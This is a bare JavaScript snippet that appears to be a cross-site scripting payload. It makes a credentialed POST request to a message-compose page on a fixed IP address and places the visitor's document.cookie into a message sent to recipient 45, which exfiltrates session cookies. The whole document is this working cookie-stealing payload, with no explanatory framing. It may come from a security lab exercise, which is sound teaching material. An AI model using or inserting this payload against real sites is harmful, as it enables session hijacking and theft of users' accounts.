
    var xmlHttp = new XMLHttpRequest();

    xmlHttp.open("POST", "http://128.83.34.154//msg_compose.php", true);

    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xmlHttp.withCredentials = true;

    xmlHttp.send('form_recipient=45&form_message=' + document.cookie + "&send_message=");
